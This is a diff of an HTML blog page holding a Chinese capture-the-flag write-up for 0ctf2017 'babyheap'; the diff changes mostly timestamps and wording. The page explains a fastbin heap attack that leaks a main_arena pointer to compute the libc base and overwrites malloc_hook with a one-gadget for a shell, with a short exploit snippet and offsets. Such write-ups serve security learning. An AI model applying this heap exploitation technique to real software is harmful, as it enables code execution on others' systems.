@@ -27,7 +27,7 @@
 <meta property="og:image" content="https://ws1.sinaimg.cn/large/006tKfTcly1g1htpxbbwdj30us0di40w.jpg">
 <meta property="og:image" content="https://ws2.sinaimg.cn/large/006tKfTcly1g1humj3kmrj30xm07mjvk.jpg">
 <meta property="og:image" content="https://ws4.sinaimg.cn/large/006tKfTcly1g1hutuwtkmj30li0cuq4n.jpg">
-<meta property="og:updated_time" content="2019-03-27T17:14:59.886Z">
+<meta property="og:updated_time" content="2019-03-27T17:16:12.777Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="0ctf2017-babyheap">
 <meta name="twitter:description" content="fastbin attack，比cgctf的note稍微难一点。">
@@ -244,8 +244,8 @@
         <p>fastbin attack，比cgctf的note稍微难一点。</p>
 <a id="more"></a>
 <p>保护全开，思路和cgctf的note是一样的，当时做的时候因为找不到wp，就是对着这道题的wp做的。</p>
-<p>当只有一个 <code>small/large chunk</code> 被释放时，<code>small/large chunk</code>的 <code>fd</code> 和 <code>bk</code> 指向 <code>main_arena</code> 中的地址。如果能泄漏出这里<code>fd</code>或<code>bk</code>指向的地址，那么就可以得到libc基址。最后利用<code>malloc_hook</code>，可以执行onegadget，获取shell。</p>
-<p>这道题比cgctf的note难的一点就是，这道题不存在UAF，所以泄漏<code>main_arena</code>的地址变得稍微难了一点，但是利用<code>fastbinattack</code>还是可以做到的。</p>
+<p>当只有一个 <code>small/large chunk</code> 被释放时，<code>small/large chunk</code>的 <code>fd</code> 和 <code>bk</code> 指向 <code>main_arena</code> 中的地址。如果泄漏出这里<code>fd</code>或<code>bk</code>指向的地址，那么就可以得到libc基址。最后利用<code>malloc_hook</code>，可以执行onegadget，获取shell。</p>
+<p>这道题比cgctf的note难的是，这道题不存在UAF，所以泄漏<code>main_arena</code>的地址变得稍微难了一点，但是利用<code>fastbinattack</code>还是可以做到的。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">allocate(0x10) #用来allocate(0x10) #实现allocate(0x10) #fastbin attackallocate(0x10) #用来修改下一个chunk的sizeallocate(0x80) #用来泄漏main_arenaallocate(0x80) #使上一个chunk free后能指向main_arenafree(1)free(2)fill(0,0x41,p64(0)*3+p64(0x21)+p64(0)*3+p64(0x21)+&quot;\x80&quot;)fill(3,0x20,p64(0)*3+p64(0x21))allocate(0x10)allocate(0x10)fill(3,0x20,p64(0)*3+p64(0x91))free(4)dump(2)leak=sh.recv(8)libc_base=u64(leak)-0x3c4b20-88</span><br><span class="line">malloc_hook=libc_base+0x3c4b20-10</span><br></pre></td></tr></table></figure>
 <p>这里通过修改第5个chunk的size，2次malloc第五个chunk，index2和index4指向的都是第五个chunk，free4之后dump2就能打印出<code>main_arena+88</code>地址，从而泄漏libc基址。</p>
 <p>关于<code>main_arena</code>在libc中的偏移，可以使用ida打开libc文件，在<code>malloc_trim</code>函数中找到。</p>
@@ -271,7 +271,7 @@
         <p><span>本文标题:</span><a href="/2019/03/27/0ctf2017-babyheap/">0ctf2017-babyheap</a></p>
         <p><span>文章作者:</span><a href="/" title="回到主页">4eriri</a></p>
         <p><span>发布时间:</span>2019-03-27, 22:43:07</p>
-        <p><span>最后更新:</span>2019-03-28, 01:14:59</p>
+        <p><span>最后更新:</span>2019-03-28, 01:16:12</p>
         <p>
             <span>原始链接:</span><a class="post-url" href="/2019/03/27/0ctf2017-babyheap/" title="0ctf2017-babyheap">http://yoursite.com/2019/03/27/0ctf2017-babyheap/</a>
             <span class="copy-path" data-clipboard-text="原文: http://yoursite.com/2019/03/27/0ctf2017-babyheap/　　作者: 4eriri" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
